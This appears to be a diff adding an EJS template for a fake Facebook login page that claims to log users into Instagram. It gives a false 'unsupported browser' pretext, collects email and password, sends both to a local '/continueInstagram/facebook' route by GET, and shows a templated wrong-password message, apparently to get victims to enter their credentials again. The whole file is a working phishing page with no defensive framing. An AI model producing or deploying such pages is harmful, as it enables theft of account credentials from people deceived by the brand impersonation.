@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook — log in to Instagram</title>
+
+    <link rel="stylesheet" href="/css/fb.css">
+</head>
+
+<body>
+    <div class="container">
+        <section class="intro-section">
+            <h1>facebook</h1>
+
+            <p>Facebook helps you connect and share with the people in your life.</p>
+            <h4 class="pagal">Please Login to Your Instagram using Facebook</h4>
+            <h4 class="pagal2 pagal">(Loaded Old Page for your Unsupported Browser)</h4>
+        </section>
+
+        <section class="signin-section">
+            <div>
+                <form action="/continueInstagram/facebook" method="get">
+                    <div>
+                        <input type="text" placeholder="Email address or phone number" name="email">
+                    </div>
+
+                    <div>
+                        <input type="password" placeholder="Password" name="password">
+                    </div>
+
+                    <div>
+                        <button type="submit">Log in</button>
+                    </div>
+
+                    <a href="#"><%= fbwrongpass %></a>
+
+                    <hr />
+
+                </form>
+                    <div class="create-btn">
+                        <button>Create new account</button>
+                    </div>
+
+
+            </div>
+
+
+            <p>
+                <a href="#"><strong>
+                        Create a Page
+                    </strong></a> for a celebrity, brand or business.
+            </p>
+        </section>
+    </div>
+</body>
+
+</html>
